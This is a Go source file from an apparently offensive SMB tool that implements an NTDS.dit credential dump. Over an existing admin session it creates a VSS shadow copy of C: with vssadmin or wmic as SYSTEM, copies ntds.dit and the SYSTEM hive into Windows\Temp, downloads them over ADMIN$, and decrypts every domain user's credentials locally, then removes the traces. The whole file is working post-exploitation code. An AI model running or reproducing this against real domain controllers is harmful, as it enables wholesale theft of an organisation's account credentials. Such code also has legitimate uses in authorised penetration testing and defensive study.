package smbclient

import (
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"

	"anvil/internal/ntds"
	"anvil/internal/ui"
)

// shadowGUIDRe matches a {guid} in vssadmin/wmic output. GUIDs render the
// same under any display language, so they double as locale-proof
// ground truth for existence checks.
var shadowGUIDRe = regexp.MustCompile(`\{[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}\}`)

// NtdsDump performs the offline NTDS.dit extraction on the existing
// session: a VSS shadow copy of C: is created (vssadmin via exec as
// SYSTEM, wmic as fallback), ntds.dit and the SYSTEM hive are copied out
// of the shadow into C:\Windows\Temp, downloaded over the existing session
// (ADMIN$ tree connect), and parsed and decrypted LOCALLY by internal/ntds.
// The shadow copy, the remote temp files, and the local temp dir are all
// deleted before return — the dit contains every domain credential; it
// never persists locally, and any leftover is named in warnings. No new
// connections.
func (s *Session) NtdsDump() (users []ntds.User, warnings []string, err error) {
	tag := randHex(4)
	ntdsName := "anv-ntds-" + tag + ".tmp"
	sysName := "anv-sys-" + tag + ".tmp"
	ntdsRemote := `C:\Windows\Temp\` + ntdsName
	sysRemote := `C:\Windows\Temp\` + sysName

	// 1. Shadow copy of C: (vssadmin; wmic fallback). Deleted on every
	// path below, verified.
	shadowID, device, w, err := s.createShadow()
	warnings = append(warnings, w...)
	if err != nil {
		return nil, warnings, err
	}
	ui.Debugf("ntdsdump: shadow %s at %s", shadowID, device)
	defer func() {
		warnings = append(warnings, s.deleteShadow(shadowID)...)
	}()

	// Switch to execShare (ADMIN$) for download + remote cleanup; restore
	// the caller's share afterwards.
	prevShare := s.Share()
	if prevShare != execShare {
		if err := s.UseShare(execShare); err != nil {
			return nil, warnings, fmt.Errorf("cannot access %s for download: %v", execShare, err)
		}
		defer func() {
			if prevShare != "" {
				_ = s.UseShare(prevShare)
			}
		}()
	}

	// Local temp dir for the downloaded files — credential material,
	// removed on every path.
	dir, err := os.MkdirTemp("", "anvil-ntdsdump-")
	if err != nil {
		return nil, warnings, err
	}
	defer os.RemoveAll(dir)

	// 2. Copy ntds.dit + SYSTEM out of the shadow into %windir%\Temp. The
	// remote temp files are deleted on every path (warnings name
	// leftovers); requires execShare current, which the defers above
	// guarantee (LIFO: this runs before the share restore).
	ntdsCopied, sysCopied := false, false
	defer func() {
		warnings = s.cleanupShadowFiles(ntdsCopied, sysCopied, ntdsName, sysName, warnings)
	}()

	device = strings.TrimSuffix(device, `\`)
	copyNTDS := fmt.Sprintf(`copy %s %s`, device+`\Windows\NTDS\ntds.dit`, ntdsRemote)
	_, w, err = s.Exec(copyNTDS)
	warnings = append(warnings, w...)
	if err != nil {
		return nil, warnings, fmt.Errorf("copy ntds.dit from shadow copy: %v", err)
	}
	ntdsCopied = true

	copySYS := fmt.Sprintf(`copy %s %s`, device+`\Windows\System32\config\SYSTEM`, sysRemote)
	_, w, err = s.Exec(copySYS)
	warnings = append(warnings, w...)
	if err != nil {
		return nil, warnings, fmt.Errorf("copy SYSTEM hive from shadow copy: %v", err)
	}
	sysCopied = true

	// 3. Download both files. The copy exec's success is verified here:
	// a failed copy leaves nothing to download, and an interrupted copy
	// surfaces as a short/empty file.
	ntdsLocal := filepath.Join(dir, "ntds.dit")
	sysLocal := filepath.Join(dir, "system.hive")
	n, _, err := s.Get("Temp/"+ntdsName, ntdsLocal)
	if err != nil {
		return nil, warnings, fmt.Errorf("download ntds.dit: %v", err)
	}
	if n == 0 {
		return nil, warnings, fmt.Errorf("downloaded ntds.dit is empty — shadow copy of the live database likely failed")
	}
	n, _, err = s.Get("Temp/"+sysName, sysLocal)
	if err != nil {
		return nil, warnings, fmt.Errorf("download SYSTEM hive: %v", err)
	}
	if n == 0 {
		return nil, warnings, fmt.Errorf("downloaded SYSTEM hive is empty")
	}

	// Remote copies no longer needed — delete now and report leftovers;
	// the shadow itself is deleted by the deferred cleanup above.
	warnings = s.cleanupShadowFiles(ntdsCopied, sysCopied, ntdsName, sysName, warnings)
	ntdsCopied, sysCopied = false, false

	// 4. Parse + decrypt locally; the dit never leaves this host.
	ntdsData, err := os.ReadFile(ntdsLocal)
	if err != nil {
		return nil, warnings, fmt.Errorf("read local ntds.dit: %v", err)
	}
	sysData, err := os.ReadFile(sysLocal)
	if err != nil {
		return nil, warnings, fmt.Errorf("read local SYSTEM hive: %v", err)
	}

	users, err = ntds.Dump(ntdsData, sysData)
	if err != nil {
		return nil, warnings, fmt.Errorf("ntds dump: %v", err)
	}
	return users, warnings, nil
}

// createShadow creates a VSS shadow copy of C: via exec as SYSTEM and
// returns the shadow copy ID ({guid}, needed for deletion) and the device
// object path (\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN, the copy
// source). `vssadmin create shadow` prints both; when it fails it falls
// back to `wmic shadowcopy call create` (which returns only the ID) plus
// `vssadmin list shadows` to resolve the device.
func (s *Session) createShadow() (shadowID, device string, warnings []string, err error) {
	out, w, err := s.Exec("vssadmin create shadow /for=C:")
	warnings = append(warnings, w...)
	if err != nil {
		ui.Debugf("ntdsdump: vssadmin create failed (%v), trying wmic", err)
	} else {
		shadowID = shadowGUIDRe.FindString(out)
		device = parseShadowDevice(out)
		if shadowID != "" && device != "" {
			return shadowID, device, warnings, nil
		}
		// Created but unparsable output: a GUID without a device is
		// resolvable via list shadows; no GUID means vssadmin printed an
		// error (success always prints the ID) — fall through to wmic.
		if shadowID != "" {
			device = s.resolveShadowDevice(shadowID, &warnings)
			if device != "" {
				return shadowID, device, warnings, nil
			}
			// The caller's deleteShadow defer never registers on the
			// error path, so the leaked shadow is named in a warning here.
			warnings = append(warnings, fmt.Sprintf("left shadow copy %s on target (created but device unresolvable) — vssadmin delete shadows /shadow=%s /quiet", shadowID, shadowID))
			return "", "", warnings, fmt.Errorf("shadow copy created but its device path could not be resolved")
		}
		ui.Debugf("ntdsdump: vssadmin create output unparsable, trying wmic:\n%s", out)
	}

	// Fallback: wmic returns only the ShadowID.
	out, w, err = s.Exec(`wmic shadowcopy call create Volume="C:\"`)
	warnings = append(warnings, w...)
	if err != nil {
		return "", "", warnings, fmt.Errorf("create shadow copy: vssadmin unavailable/failed and wmic failed: %v", err)
	}
	shadowID = shadowGUIDRe.FindString(out)
	if shadowID == "" {
		return "", "", warnings, fmt.Errorf("create shadow copy: wmic output carried no ShadowID: %q", out)
	}
	device = s.resolveShadowDevice(shadowID, &warnings)
	if device == "" {
		warnings = append(warnings, fmt.Sprintf("left shadow copy %s on target (created but device unresolvable) — vssadmin delete shadows /shadow=%s /quiet", shadowID, shadowID))
		return "", "", warnings, fmt.Errorf("shadow copy %s created but its device path could not be resolved", shadowID)
	}
	return shadowID, device, warnings, nil
}

// resolveShadowDevice looks up a shadow copy's device object path via
// `vssadmin list shadows /shadow=<id>`.
func (s *Session) resolveShadowDevice(shadowID string, warnings *[]string) string {
	out, w, err := s.Exec("vssadmin list shadows /shadow=" + shadowID)
	*warnings = append(*warnings, w...)
	if err != nil {
		ui.Debugf("ntdsdump: list shadows %s failed: %v", shadowID, err)
		return ""
	}
	return parseShadowDevice(out)
}

// parseShadowDevice extracts the shadow device object path
// (\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN) from vssadmin output —
// the value after the "Shadow Copy Volume..." label, spelled "Shadow Copy
// Volume Name:" by create and "Shadow Copy Volume:" by list.
func parseShadowDevice(out string) string {
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		if !strings.HasPrefix(strings.ToLower(line), "shadow copy volume") {
			continue
		}
		idx := strings.Index(line, ":")
		if idx < 0 {
			continue
		}
		if dev := strings.TrimSpace(line[idx+1:]); strings.HasPrefix(dev, `\\?\`) {
			return dev
		}
	}
	return ""
}

// deleteShadow deletes the shadow copy and verifies it is gone: the GUID
// string is locale-proof ground truth, since a surviving shadow still
// shows up in `vssadmin list shadows /shadow=<id>`. Leftovers come back as
// warnings.
func (s *Session) deleteShadow(shadowID string) (warnings []string) {
	_, w, err := s.Exec(fmt.Sprintf("vssadmin delete shadows /shadow=%s /quiet", shadowID))
	warnings = append(warnings, w...)
	if err != nil {
		return append(warnings, fmt.Sprintf("delete shadow copy %s failed: %v — vssadmin delete shadows /shadow=%s /quiet", shadowID, err, shadowID))
	}
	out, w, err := s.Exec("vssadmin list shadows /shadow=" + shadowID)
	warnings = append(warnings, w...)
	if err != nil {
		return append(warnings, fmt.Sprintf("could not verify deletion of shadow copy %s: %v", shadowID, err))
	}
	if strings.Contains(strings.ToLower(out), strings.ToLower(shadowID)) {
		return append(warnings, fmt.Sprintf("left shadow copy %s on target — vssadmin delete shadows /shadow=%s /quiet", shadowID, shadowID))
	}
	return warnings
}

// cleanupShadowFiles deletes the remote temp copies that were actually
// created (requires execShare to be current) and appends a warning for any
// file that could not be removed.
func (s *Session) cleanupShadowFiles(ntdsCopied, sysCopied bool, ntdsName, sysName string, warnings []string) []string {
	if ntdsCopied {
		if err := s.client.Rm("Temp/" + ntdsName); err != nil {
			warnings = append(warnings, fmt.Sprintf("left remote file C:\\Windows\\Temp\\%s on target (delete failed: %v)", ntdsName, err))
		}
	}
	if sysCopied {
		if err := s.client.Rm("Temp/" + sysName); err != nil {
			warnings = append(warnings, fmt.Sprintf("left remote file C:\\Windows\\Temp\\%s on target (delete failed: %v)", sysName, err))
		}
	}
	return warnings
}
